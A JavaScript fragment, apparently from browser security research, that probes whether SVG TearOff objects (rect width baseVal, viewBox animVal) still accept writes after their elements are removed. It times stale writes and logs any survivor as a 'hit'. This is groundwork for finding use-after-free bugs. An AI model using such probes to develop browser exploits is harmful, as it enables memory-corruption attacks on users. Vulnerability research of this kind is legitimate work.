    var t_av=timeWrite(function(i){R_av.x=i+9999;},'ADR119: R_av stale write after svg remove',500);
    if(t_av>0.5){
      L('★★★ ADR119: R_av (viewBox animVal) ALIVE after svg remove!','hit');
    }

    // SVGAnimatedLength probe (separate SVGRect-like TearOff)
    var svg2=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg2);
    var r=document.createElementNS(SVG_NS,'rect');
    r.setAttribute('x','0');r.setAttribute('y','0');
    r.setAttribute('width','100');r.setAttribute('height','50');
    svg2.appendChild(r);

    // Grab SVGAnimatedLength TearOffs (non-list SVGLength)
    var W_bv=r.width.baseVal;// SVGLength TearOff (non-list, single value)
    var H_bv=r.height.baseVal;
    L('ADR119: rect W_bv.value='+W_bv.value+' H_bv.value='+H_bv.value,'info');

    // Baseline
    var tW=timeWrite(function(i){W_bv.value=i+50;},'ADR119: baseline W_bv.value write',500);

    // Remove rect
    svg2.removeChild(r);
    L('ADR119: rect removed from svg2','info');

    var tWstale=timeWrite(function(i){W_bv.value=i+77777;},'ADR119: W_bv stale write after rect remove',500);
    if(tWstale>0.5){
      L('★★★ ADR119: W_bv (rect.width.baseVal) ALIVE after rect remove!','hit');
    } else {
      L('ADR119: W_bv dead after rect remove','info');
    }

    // Remove svg2 entirely
    svg2.remove();
    var tWstale2=timeWrite(function(i){W_bv.value=i+88888;},'ADR119: W_bv stale write after svg2 remove',500);
    if(tWstale2>0.5){
      L('★★★ ADR119: W_bv ALIVE after svg2 remove!','hit');
    } else {
      L('ADR119: W_bv dead after svg2 remove','info');
    }

    // Read back values
    L('ADR119: W_bv.value after all stale writes='+W_bv.value,'info');
    L('ADR119: R_bv.x after all stale writes='+R_bv.x,'info');
    L('ADR119: done.','info');
  });
};
